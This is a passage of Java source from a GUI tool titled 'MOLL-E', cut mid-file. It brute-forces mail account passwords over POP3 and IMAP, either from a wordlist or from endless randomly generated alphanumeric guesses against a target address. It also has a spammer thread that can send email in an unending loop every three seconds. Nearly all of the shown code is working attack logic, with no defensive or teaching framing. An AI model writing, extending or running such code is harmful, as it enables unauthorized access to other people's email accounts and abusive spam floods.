    				        pop3auth(tfBFserver.getText(), tfBFmail.getText(), lineText);
    				        Thread.sleep(Integer.parseInt(tfwordlistdelay.getText()));
    				    	} catch (Exception e) {e.printStackTrace();}
    				    	
    				    }
    				 
    				    lineReader.close();
    				} catch (IOException ex) {
    					BFconsole.setText(BFconsole.getText()+"\nError");
    				    JOptionPane.showMessageDialog(null, ex.toString(),"Error",JOptionPane.ERROR_MESSAGE);
    				    f.setTitle("MOLL-E");
    				    startbutton.setEnabled(true);
    				}
    				BFconsole.setText(BFconsole.getText()+"\nEnd of Wordlist");
    				f.setTitle("MOLL-E");
    				startbutton.setEnabled(true);
			}
	    	
	    	if(combobox.getSelectedItem().equals("imap")){
				
				try {
				    LineNumberReader lineReader = new LineNumberReader(new FileReader(wordlist));
				    String lineText = null;
				 
				    while ((lineText = lineReader.readLine()) != null) {
				    	
				    	try {
				        //BFconsole.setText(BFconsole.getText()+"\nLine "+lineReader.getLineNumber());
				    	f.setTitle("MOLL-E  Work in Progress ( "+lineReader.getLineNumber()+" / "+wordlistsize+" )");
				    	System.out.println(lineText);
				        imapauth(tfBFserver.getText(), tfBFmail.getText(), lineText);
				        Thread.sleep(Integer.parseInt(tfwordlistdelay.getText()));
				    	} catch (Exception e) {e.printStackTrace();}
				    	
				    }
				 
				    lineReader.close();
				} catch (IOException ex) {
					BFconsole.setText(BFconsole.getText()+"\nError");
				    JOptionPane.showMessageDialog(null, ex.toString(),"Error",JOptionPane.ERROR_MESSAGE);
				    f.setTitle("MOLL-E");
				    startbutton.setEnabled(true);
				}
				BFconsole.setText(BFconsole.getText()+"\nEnd of Wordlist");
				f.setTitle("MOLL-E");
				startbutton.setEnabled(true);
		}
	    		
	    		
	    	
	    	}else{
	    		//no wordlist
	    		while(true){
		    		
	    	    	try{
	    	    		
	    	    		StringBuilder sb = new StringBuilder();
	    	    		//0 rakam 48 to 57
	    	    		//1 kucuk harf 97 to 122
	    	    		//2 buyuk harf 65 to 90
	    	    		for (int i = 0; i < r.nextInt(upperlimit - lowerlimit +1)+lowerlimit; i++) {
	    	    			
	    	    			int anyfromthree = r.nextInt(3);
	    	    			
	    	    			if (anyfromthree==0) {
	    	    				sb.append((char)(r.nextInt(10)+48));
	    	    			}
	    	    			if (anyfromthree==1) {
	    	    				sb.append((char)(r.nextInt(26)+97));
	    	    			}
	    	    			if (anyfromthree==2) {
	    	    				sb.append((char)(r.nextInt(26)+65));
	    	    			}
	    	    			
	    	    		}
	    	    		
	    	    		String generatedpassword = sb.toString();
	    	    		
	    			
	    			//System.out.println(generatedpassword);
	    			try{Thread.sleep(delay); }catch(IllegalArgumentException e2){resetsettings();}
	    			
	    			checkmail(tfBFserver.getText(), tfBFmail.getText(), generatedpassword);
	    			
	    			
	    			Thread.sleep(200);
	    			//counter++;
	    			
	    	    		}catch (Exception e) {e.printStackTrace();}
	    			          
	    	    	}
	    		
	    	}
	    	
	    	
	
	    }
	}//end of BFThread
	
	public static class SpammerThread extends Thread {

		
	    public SpammerThread() throws Exception {

	    	
	    }

	    @Override
	    public void run() {
	    	
	    	 String countstring = tfemailcount.getText();
	    	 
			 if(countstring.equals("E")){
			    	
				 while(true){
			    		
			    		try{sendmail();}catch (Exception e) {e.printStackTrace();}
			    			
			    		try {Thread.sleep(3000);} catch (InterruptedException e) {e.printStackTrace();}
			    		
			    	}
				 
			    }else{
			    	
			    	try{sendmail();}catch (Exception e) {e.printStackTrace();}
			    	b1.setEnabled(true);
			    }
			 
	    	 
			 
	    	
	    	
	
	    }
	}//end of SpammerThread

}
